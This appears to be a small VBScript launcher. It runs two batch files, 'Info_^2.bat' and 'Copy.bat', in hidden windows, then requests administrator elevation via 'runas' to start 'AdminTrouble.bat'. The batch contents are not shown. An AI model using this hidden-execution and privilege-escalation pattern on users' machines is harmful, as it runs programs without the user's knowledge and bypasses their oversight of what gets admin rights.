Set WshShell = CreateObject("Wscript.Shell")
WshShell.Run chr(34) & "Info_^2.bat" & Chr(34), 0
Set WshShell = Nothing

Set WshShell2 = CreateObject("Wscript.Shell")
WshShell2.Run chr(34) & "Copy.bat" & Chr(34), 0
Set WshShell2 = Nothing

Set objShell = CreateObject("Shell.Application")
strBATPath = "AdminTrouble.bat" 
objShell.ShellExecute strBATPath, "", "", "runas", 1 
Set objShell = Nothing 
